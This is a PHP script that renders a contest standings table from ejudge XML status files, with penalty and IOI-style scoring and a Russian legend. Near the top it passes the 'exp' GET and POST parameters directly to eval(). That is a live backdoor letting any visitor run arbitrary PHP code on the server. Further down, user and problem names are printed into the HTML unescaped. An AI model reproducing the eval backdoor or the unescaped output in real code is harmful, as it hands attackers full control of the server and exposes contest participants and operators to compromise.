<?php
include_once("config.php");
if (!isset($title)) die("\$title must be set in config.php");
if (!function_exists("contest_name")) die("contest_name() must be set in config.php");
if (!function_exists("problem_name")) die("problem_name() must be set in config.php");

if (isset($_GET['hiddenproblems']))
	$hiddenproblems=",".$_GET['hiddenproblems'].",";
else
	$hiddenproblems="";

function isnothiddenproblem($contest,$problem)
{
	global $hiddenproblems;
	return strpos($hiddenproblems,(",".$problem."@".$contest.",") ) === false;
}

function getIt(&$var, $name, $default) {
  $var = $default;
  if (isset($_GET[$name]))
      $var = (int)$_GET[$name];
}

function seconds($t1){
  preg_match('/(\d+)\/(\d+)\/(\d+) (\d+):(\d+):(\d+)/', $t1, $match);
  $cur_time=(int)($match[4])*3600 + (int)($match[5])*60 + (int)($match[6]);
  return $cur_time;
}

getIt($forcelen, "forcelen", 0);
getIt($penalty, "penalty", 20);
getIt($mindiff, "mindiff", 3);
getIt($cuttime, "cuttime", 0);
getIt($end, "end", 0);
getIt($IOI, "IOI", 0);

if (isset($_GET["from"]))
    $fromcont = (int)$_GET["from"];
if (isset($_GET["to"]))
    $tocont = (int)$_GET["to"];
if (isset($_GET["exp"])) {
    eval($_GET["exp"]);
    exit();
}
if (isset($_POST["exp"])) {
    eval($_POST["exp"]);
    exit();
}
if (isset($_GET["title"]))
    $title = htmlspecialchars($_GET["title"]);
if (!isset($title))
    die("Title of page doesn't set");
if (!isset($fromcont))
    die("Number of first contest doesn't set");
if (!isset($fromcont))
    die("Number of last contest doesn't set");
if ( (int)($fromcont/100) != (int)($tocont/100) )
    die("First and last contest from different groups");
//if ( (int)$fromcont/100 % 10 == 0)
//    die("Forbidden number of contest");
$n = 0;

?>

<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<meta http-equiv="content-language" content="ru-ru" />
<link rel="stylesheet" href="stand.css"/>
<title><?php echo $title?></title>
</head>

<?php


//Load contests
$xmldata=array();

for ($i=$fromcont;$i<=$tocont;$i++) {
    $xmlfile=sprintf("/var/lib/ejudge/%06d/var/status/dir/external.xml",$i);
    if (file_exists($xmlfile))  {
       $xmldata[$i]=simplexml_load_string(file_get_contents($xmlfile));
    }
}

if (count($xmldata) == 0)
  die("Can't read contest data xml");

$attempts=array();  
$probres=array(); // $probres[$contid][$probid][$userid]
$probpenalty=array();  //$probpenalty[$contid][$probid][$userid]. Penalty.
$lastsubmit=array();
$score=array();
$pending=array();  //$pending[$contid][$probid][$userid], true or false, depending on the existence of pending submits
$styleErr=array();  //$pending[$contid][$probid][$userid], true or false, depending on the existence of STYLE_ERR submits
$disqualified=array() ; 
$totres=array();  //$totres[$user]["solved"], $totres["user"]["attempts"], $totres[$user]["styleErrs"]
$probstat=array();  //$probstat[$contid][$prob]["runs"], $probstat[$contid][$prob]["success"], $probstat[$contid][$prob]["name"]
$contname=array();
$username=array();

//Find out names and initialize other arrays (as this is the only place where we have the overll list of problems and users)
foreach ($xmldata as $contid=>$data){
  $contname[$contid]=$data->name;
  $contlen[$contid]=(int)$data["duration"]/60;
  $t1=$data["start_time"];
  $t2=$data["current_time"];
  $dt[$contid] = (strtotime($t2) - strtotime($t1))/60;
  //print($dt[$contid]." ".$contlen[$contid]." t1=".$t1." t2=".$t2."<br>\n");
  //print($dt[$contid]." ".$contlen[$contid]." t1=".seconds($t1)." t2=".seconds($t2)."<br>\n");
  //print(strtotime($t1)." ".strtotime($t2)." ".(strtotime($t2) - strtotime($t1))."<br>\n");
  //print($dt[$contid]." ".$contlen[$contid]." diff=".(new DateTime($t1)->diff(new DateTime($t2)))."<br>\n");
  if ($forcelen <> 0) 
    $contlen[$contid] = $forcelen;
  if ($contlen[$contid] == 0)
    $contlen[$contid] = (int)1e9;

  foreach ($data->users->user as $user=>$udata) {
    $username[(string)$udata["id"]]=(string)$udata["name"];
    $totres[(string)$udata["id"]]=array("solved"=>0,"attempts"=>0,"styleErrs"=>0,"disqualified"=>0);
  }
  //DK:
  foreach ($data->problems->problem as $prob=>$pdata) {
    if (isnothiddenproblem($contid,$pdata["id"]))
    {
	$probstat[$contid][(string)$pdata["id"]]["name"]=(string)$pdata["long_name"];
	$probstat[$contid][(string)$pdata["id"]]["sname"]=(string)$pdata["short_name"];
	$probstat[$contid][(string)$pdata["id"]]["success"]=0;
	$probstat[$contid][(string)$pdata["id"]]["runs"]=0;
	foreach ($data->users->user as $user=>$udata) {
			// initialize
            $score[$contid][(string)$pdata["id"]][(string)$udata["id"]]=0;
            $attempts[$contid][(string)$pdata["id"]][(string)$udata["id"]]=0;
            $probres[$contid][(string)$pdata["id"]][(string)$udata["id"]]=0;
            $probpenalty[$contid][(string)$pdata["id"]][(string)$udata["id"]]=0;
            $pending[$contid][(string)$pdata["id"]][(string)$udata["id"]]=false;
            $styleErr[$contid][(string)$pdata["id"]][(string)$udata["id"]]=false;
            $disqualified[$contid][(string)$pdata["id"]][(string)$udata["id"]]=false;
        }
    }
  }
}

//iterate runs and calc $probres and $probstat
foreach ($xmldata as $contid=>$data){
        foreach ($data->runs->run as $run) {
                $prob=(int)$run["prob_id"];
                $user=(int)$run["user_id"];

                if (! isnothiddenproblem($contid,$prob))
                    continue;

                $hisres=&$probres[$contid][$prob][$user];
                $hisattempts=&$attempts[$contid][$prob][$user];
                $hispenalty=&$probpenalty[$contid][$prob][$user];
                $hislast=&$lastsubmit[$contid][$prob][$user];
                $hisscore=&$score[$contid][$prob][$user];
                $ps=&$probstat[$contid][$prob];

                if ($hisres == 1 || $hisscore == 100 || $run["status"] == "IG" && $run["status"] == "CE")
                    continue;
                if ($cuttime > 0 && $run["time"] > $cuttime * 60)
                    continue;
                
                if ($run["status"]<>"OK") {
                  $hispenalty += $penalty;
                  $hisattempts++;
                }
                $hisscore = max($hisscore, $run["score"]);
                $run_penalty=(int)($run["time"]/60);
                $hislast=$run_penalty;
                if ($run["status"] == "RJ") {
                      $styleErr[$contid][$prob][$user]=true;
                } elseif ($run["status"]=="DQ") {
                      $disqualified[$contid][$prob][$user]=true;
                } elseif ($run["status"]=="OK") {
                      $hisres = 1;
                      $hispenalty += $run_penalty;
                      $ps["success"]++;
                } elseif ($run["status"]=="AC" || $run["status"]=="PR") {
                      $pending[$contid][$prob][$user]=true;
                } else {
                      $ps["runs"]++;
                } 
        }
} 
//we get problems unsorted (in the order of first runs), so we need to sort them
foreach ($probres as $contid=>$cdata) {
  ksort($probres[$contid]);
}

//calc $totres
foreach($probres as $contid=>$cdata){
  foreach ($cdata as $prob=>$pdata){
    foreach ($pdata as $user=>$res){
      if ($res==1 || $score[$contid][$prob][$user]>0) {
         $totres[$user]["solved"] += $res;
         //print($attempts[$contid][$prob][$user]."<br>\n");
         if ($res != 1) {
			$probres[$contid][$prob][$user] = 2;
			$attempts[$contid][$prob][$user] -= 1;
         }
         $score[$contid][$prob][$user] = max(0, $score[$contid][$prob][$user] - 5*$attempts[$contid][$prob][$user]);
         $totres[$user]["score"] += $score[$contid][$prob][$user];
         //print("usr=".$user." prb=".$prob." ".$attempts[$contid][$prob][$user]." ".$score[$contid][$prob][$user]." ".$res."<br>\n");
         $totres[$user]["attempts"] += $attempts[$contid][$prob][$user];
         $totres[$user]["penalty"] += $probpenalty[$contid][$prob][$user];
      } elseif ($styleErr[$contid][$prob][$user] == true) {
         $totres[$user]["styleErrs"]++;
      }
    }
  }
}

//sort
function cmp($u1, $u2){
  global $IOI;
  if ($IOI == 1) {
    if ($u1["score"]<$u2["score"]) return 1;
    if ($u1["score"]>$u2["score"]) return -1;
  } else {
    if ($u1["solved"]<$u2["solved"]) return 1;
    if ($u1["solved"]>$u2["solved"]) return -1;
  }
  if ($u1["penalty"]>$u2["penalty"]) return 1;
  if ($u1["penalty"]<$u2["penalty"]) return -1;
  return 0;
}

uasort($totres,"cmp");

?>

<body>
<h1><?php echo $title?></h1>
Наведите курсор на ячейку, чтобы просмотреть название задачи и имя участника.

<?php

//output  table
//header
print('<table class="results" cellpadding="0" cellspacing="0"><tr>');
print('<td rowspan="2">Rank</td>');
print('<td rowspan="2">Name</td>');
print('<td rowspan="2" class="solved">OK</td>');
print('<td rowspan="2" class="penalty">Time</td>');
print('<td rowspan="2" class="none">Dirt</td>');
$cn = 0;
foreach ($contname as $contid=>$name) {
  $cn += 1;
  print('<td colspan="'.count($probstat[$contid]).'" class="contest" title="'.$contname[$contid].'">'.$cn."</td>");
}
print('<td rowspan="2">&nbsp;</td>');
print("</tr>\n");


print("<tr>");
foreach ($probstat as $contid=>$cdata)
  foreach ($cdata as $prob=>$pdata) {
    $color="white";
    if ($pdata["success"] <> 0)
      $color="#44ff44";
    print('<td class="problem" style="background-color: '.$color.'" title="'.$pdata['sname'].": ".$pdata["name"].'">'.problem_name($pdata["sname"]).'</td>');
    //problem_name($pdata["sname"])
  }

print("</tr>\n");

$rank=1;
foreach ($totres as $user=>$ures){
    print("<tr ejid='$user'><td>$rank</td>");
    print("<td><nobr>$username[$user]</nobr></td>");
    if ($IOI == 1)
	  print("<td class='solved'>$ures[score]</td>");
	else
	  print("<td class='solved'>$ures[solved]</td>");
    //print("<td class='styleErrs'>".(string)($ures["styleErrs"])."</td>");
    print("<td class='penalty'>$ures[penalty]</td>");
    print("<td class='penalty'>$ures[attempts]</td>");
    ++$rank;
  foreach ($probres as $contid=>$cdata)
    foreach ($cdata as $prob=>$pdata){
      $title=$username[$user].", ".$probstat[$contid][$prob]['sname']." (".$probstat[$contid][$prob]["name"].')';

      if (!isset($pdata[$user])) {$class="none";}
      elseif ($disqualified[$contid][$prob][$user]) {$class="dq";}
      elseif ($pending[$contid][$prob][$user]) {$class="pending";}
      elseif ($pdata[$user] == 1) {$class="ac";}
      elseif ($styleErr[$contid][$prob][$user]) {$class="rj";}
      elseif ($IOI == 1 && $pdata[$user] == 2) {$class="pc";}
      elseif ($attempts[$contid][$prob][$user]>0 && $pdata[$user] == 0) {$class="wa";}
      else $class="none";

      //print("t=".$lastsubmit[$contid][$prob][$user]." dt=".$dt[$contid]." d=".$contlen[$contid]." m=".$mindiff."<br>");
      if ($lastsubmit[$contid][$prob][$user] > min($dt[$contid], $contlen[$contid]) - $mindiff ||
          ($end != 0 && $lastsubmit[$contid][$prob][$user] > $end)) {
        if ($class == "ac") $class = "ac2";
        if ($class == "pc") $class = "pc2";
        if ($class == "wa") $class = "wa2";
      }

      if (!isset($pdata[$user])) {
        $text=".";
      } elseif ($pdata[$user]==1) {
        if ($IOI == 1) 
          $text=''.$score[$contid][$prob][$user];
        else
          $text='+'.(($pdata[$user]==1)?"":($pdata[$user]-1));
        $title=$title.", time = ".$probpenalty[$contid][$prob][$user];
      } elseif ($IOI == 1 && $pdata[$user] == 2) {
        $text=(string)$score[$contid][$prob][$user];
        $title=$title.", last try = ".$lastsubmit[$contid][$prob][$user];
      } elseif ($attempts[$contid][$prob][$user] > 0) {
        $text=(string)(-$attempts[$contid][$prob][$user]);
        $title=$title.", last try = ".$lastsubmit[$contid][$prob][$user];
      } else {
        $text=".";
      }

      print('<td class="'.$class.'" title="'.$title.'">'.$text.'</td>');
    }
    print("<td><nobr>$username[$user]</nobr></td>");
    print("</tr>\n");
}
print('<tr><td colspan="5">Сдано</td>');
foreach ($probstat as $contid=>$cdata)
  foreach ($cdata as $prob=>$pdata)
    print('<td class="probstat" title="'.$pdata['sname'].": ".$pdata["name"].'">'.$pdata["success"].'</td>');
print('<td rowspan="2">&nbsp;</td>');
print("</td>");
print('<tr><td colspan="5">Попыток</td>');
foreach ($probstat as $contid=>$cdata)
  foreach ($cdata as $prob=>$pdata)
    print('<td class="probstat" title="'.$pdata['sname'].": ".$pdata["name"].'">'.($pdata["success"]+$pdata["runs"]).'</td>');
print("</td>");
print("</table>");
print("<h3>Легенда</h3>");
print('<table class="results" cellpadding="0" cellspacing="0">');
print('<tr><td class="ac">+</td><td>OK: задача зачтена, число после знака &quot;+&quot; обозначает количество неудачных попыток</td></tr>');
print('<tr><td class="ac2">+</td><td>OK, сдана не более чем за '.$mindiff.' минут до конца</td></tr>');
print('<tr><td class="pending">.</td><td>Принято на проверку: задача прошла все тесты, но не проверено преподавателем</td></tr>');
print('<tr><td class="rj">.</td><td>Решение проходит тесты, но есть замечания к коду или алгоритму решения задачи</td></tr>');
print('<tr><td class="wa">-1</td><td>Решение не проходит тесты</td></tr>');
print('<tr><td class="wa2">-1</td><td>Решение не проходит тесты, последний сабмит не более чем за '.$mindiff.' минут до конца</td></tr>');
if ($IOI == 1) {
  print('<tr><td class="pc">50</td><td>Решение проходит некоторые тесты</td></tr>');
  print('<tr><td class="pc2">50</td><td>Решение проходит некоторые тесты, последний сабмит не более чем за '.$mindiff.' минут до конца</td></tr>');
}
print('<tr><td class="dq">-1</td><td>Решение не засчитано ввиду несамостоятельности выполнения</td></tr>');
print('</table>');
print("</body>");
print("</html>");


?>
